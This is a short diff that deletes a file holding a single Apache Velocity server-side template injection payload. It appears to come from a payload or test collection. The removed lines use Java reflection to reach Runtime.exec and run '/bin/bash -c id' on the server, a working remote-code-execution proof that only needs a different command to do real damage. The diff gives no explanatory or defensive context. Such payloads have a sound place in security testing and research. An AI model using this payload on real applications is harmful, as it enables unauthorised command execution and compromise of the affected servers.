@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass.forName("java.lang.Runtime").getMethod("exec", String[].class).invoke($e.getClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null), new Object[]{new String[] {"/bin/bash","-c","id"}}).toString()
